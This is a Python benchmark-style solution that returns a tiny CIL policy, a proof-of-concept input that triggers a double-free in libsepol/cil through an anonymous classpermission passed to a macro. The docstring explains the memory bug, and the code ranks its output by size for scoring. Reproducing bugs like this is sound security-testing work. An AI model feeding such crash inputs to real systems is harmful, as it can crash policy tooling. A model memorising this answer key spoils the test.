class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a double-free of an anonymous classpermission in libsepol/cil.
        It occurs when an anonymous classpermission is passed as an argument to a macro,
        and that macro then uses the argument within a classpermissionset definition.

        The AST destruction process will free the anonymous classpermission once as
        part of the macro call's argument list, and a second time as part of the
        classpermissionset's contents, leading to a heap-use-after-free/double-free crash.

        To construct the PoC, we create a minimal CIL policy with this structure:
        1. Define a class and a permission, which are prerequisites for a classpermission.
        2. Define a macro that accepts a classpermission and uses it in a classpermissionset.
        3. Call the macro, passing an anonymous classpermission as the argument.
        4. Wrap these statements in a block to form a valid policy.

        Short, single-character names are used to minimize the PoC size for a better score.
        """
        poc = (
            b"(block b "
            b"(class c (p)) "
            b"(macro m ((classpermission x)) (classpermissionset s (x))) "
            b"(call m ((classpermission (c (p)))))"
            b")"
        )
        return poc